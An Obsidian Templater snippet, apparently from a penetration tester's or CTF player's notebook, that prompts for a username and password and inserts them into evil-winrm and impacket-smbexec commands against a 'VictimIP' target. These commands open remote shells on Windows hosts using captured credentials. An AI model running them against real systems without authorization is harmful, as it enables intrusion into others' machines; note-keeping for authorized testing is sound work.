<%*
let Name = await tp.system.prompt("Enter the name")
let Pass = await tp.system.prompt("Enter the password")
-%>
- We connect with Evil-WinRM

```
evil-winrm -i <% tp.frontmatter["VictimIP"] %> -u <% Name %> -p "<% Pass %>"
```

- We tried impacket : 

```
impacket-smbexec <% tp.frontmatter["DOMAIN"] %>/<% Name %>:<% Pass %>@<% tp.frontmatter["VictimIP"] %>  
```
